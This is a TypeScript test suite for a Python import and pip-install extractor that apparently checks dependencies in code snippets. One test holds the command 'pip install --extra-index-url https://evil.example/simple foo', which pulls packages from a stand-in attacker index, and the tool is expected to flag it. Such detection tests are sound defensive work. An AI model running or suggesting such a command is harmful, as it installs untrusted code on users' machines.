import { before, test } from "node:test";
import assert from "node:assert/strict";
import { dedent, extractFromPython, normalizeDistribution, toAbsolute } from "../extractor";
import { PythonParser } from "../pythonParser";

let parser: PythonParser;

before(async () => {
  parser = await PythonParser.create();
});

const imports = (text: string) =>
  extractFromPython(text, parser).packages.filter((p) => p.origin === "import");

test("extracts third-party imports and skips the standard library", () => {
  const r = extractFromPython("import os, requests as r\nfrom a.b import c\nimport yaml\nimport sys\n", parser);
  assert.deepEqual(
    r.packages.map((p) => [p.name, p.distribution, p.mappingConfidence]),
    [
      ["requests", "requests", "known"],
      ["a", "a", "assumed"],
      ["yaml", "PyYAML", "known"],
    ],
  );
  assert.deepEqual(r.stats.stdlibSkipped.sort(), ["os", "sys"]);
});

test("submodule imports use the top-level package", () => {
  const r = imports("import flask_gpt_helper.sub.mod\nfrom numpy.linalg import norm\n");
  assert.deepEqual(r.map((p) => p.name), ["flask_gpt_helper", "numpy"]);
});

test("relative imports are skipped and counted", () => {
  const r = extractFromPython("from . import x\nfrom ..pkg import y\nfrom .sibling import z\n", parser);
  assert.deepEqual(r.packages, []);
  assert.equal(r.stats.relativeImportsSkipped, 3);
});

test("imports inside functions and try blocks are found", () => {
  const code = "def f():\n    import numpy\n\ntry:\n    import ujson\nexcept ImportError:\n    import json\n";
  assert.deepEqual(imports(code).map((p) => p.name), ["numpy", "ujson"]);
});

test("names imported FROM a module are not treated as packages", () => {
  const r = imports("from requests import get, post\nfrom os import path\n");
  assert.deepEqual(r.map((p) => p.name), ["requests"]);
});

test("broken code still yields its imports and reports parse errors", () => {
  const code = "import requests\ndef f(:\n    import numpy\nx = (\n";
  const r = extractFromPython(code, parser);
  assert.ok(r.stats.parseHadErrors);
  const names = r.packages.map((p) => p.name);
  assert.ok(names.includes("requests"));
});

test("import span points exactly at the package name", () => {
  const code = "import requests\nimport flask_gpt_helper\n";
  const p = imports(code).find((x) => x.name === "flask_gpt_helper")!;
  const line = code.split("\n")[p.span.line];
  assert.equal(line.slice(p.span.startCharacter, p.span.endCharacter), "flask_gpt_helper");
  assert.equal(p.span.line, 1);
});

test("columns stay correct after non-ASCII characters on the same line", () => {
  const code = 's = "日本語é"; import requests\n';
  const p = imports(code)[0];
  assert.equal(code.slice(p.span.startCharacter, p.span.endCharacter), "requests");
});

test("indented snippets are dedented for parsing and columns are mapped back", () => {
  const code = "    import flask_gpt_helper\n    x = 1\n";
  const p = imports(code)[0];
  assert.equal(p.name, "flask_gpt_helper");
  assert.equal(code.slice(p.span.startCharacter, p.span.endCharacter), "flask_gpt_helper");
  assert.equal(p.span.startCharacter, 11);
});

test("CRLF line endings are handled", () => {
  const r = imports("import requests\r\nimport flask_gpt_helper\r\n");
  assert.deepEqual(r.map((p) => p.name), ["requests", "flask_gpt_helper"]);
  assert.equal(r[1].span.line, 1);
});

test("namespace packages are marked ambiguous", () => {
  const r = imports("import google.generativeai\n");
  assert.equal(r[0].name, "google");
  assert.equal(r[0].mappingConfidence, "ambiguous");
});

test("pip installs are extracted alongside imports", () => {
  const code = "import requests\n# pip install flask-gpt-helper==0.1\n";
  const r = extractFromPython(code, parser);
  const install = r.packages.find((p) => p.origin === "pip-install")!;
  assert.equal(install.name, "flask-gpt-helper");
  assert.equal(install.mappingConfidence, "explicit");
  assert.equal(install.versionSpec, "==0.1");
  assert.equal(install.span.line, 1);
});

test("the same package as import and install is kept once per origin", () => {
  const r = extractFromPython("import PIL\nimport PIL.Image\n# pip install pillow\n", parser);
  assert.equal(r.packages.length, 2);
  assert.deepEqual(r.packages.map((p) => p.origin).sort(), ["import", "pip-install"]);
  assert.equal(r.packages[0].normalized, "pillow");
  assert.equal(r.packages[1].normalized, "pillow");
});

test("security-relevant install notes are passed through", () => {
  const r = extractFromPython("pip install --extra-index-url https://evil.example/simple foo\n", parser);
  assert.equal(r.notes[0].kind, "custom-index");
});

test("empty and non-import text produce nothing", () => {
  assert.deepEqual(extractFromPython("", parser).packages, []);
  assert.deepEqual(extractFromPython("x = 1\nprint(x)\n", parser).packages, []);
});

test("normalizeDistribution follows PEP 503", () => {
  assert.equal(normalizeDistribution("Flask_GPT.Helper"), "flask-gpt-helper");
  assert.equal(normalizeDistribution("PyYAML"), "pyyaml");
});

test("dedent removes common indent and ignores blank lines", () => {
  assert.deepEqual(dedent("  a\n\n  b"), { code: "a\n\nb", indent: 2 });
  assert.deepEqual(dedent("a\n  b"), { code: "a\n  b", indent: 0 });
});

test("toAbsolute shifts lines, and columns only on the first line", () => {
  const start = { line: 10, character: 4 };
  assert.deepEqual(toAbsolute({ line: 0, startCharacter: 7, endCharacter: 12 }, start), {
    line: 10,
    startCharacter: 11,
    endCharacter: 16,
  });
  assert.deepEqual(toAbsolute({ line: 2, startCharacter: 7, endCharacter: 12 }, start), {
    line: 12,
    startCharacter: 7,
    endCharacter: 12,
  });
});
